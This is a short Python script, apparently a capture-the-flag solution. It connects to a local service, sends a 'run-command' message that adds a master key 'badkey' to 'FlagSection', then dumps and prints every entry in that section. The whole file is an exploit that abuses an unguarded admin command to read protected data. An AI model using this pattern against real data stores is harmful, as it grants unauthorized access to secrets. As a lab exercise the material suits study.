#!/usr/bin/python

from networking import State

con = State('localhost')
con.send('run-command', 'add-master-key FlagSection badkey'.encode(encoding='ascii'))
con.recv(2)

pairs = con.get_full_section('FlagSection', 'badkey')

for k, v in pairs.items():
	print('{} = {}'.format(k.decode(encoding='ascii'), v.decode(encoding='ascii')))
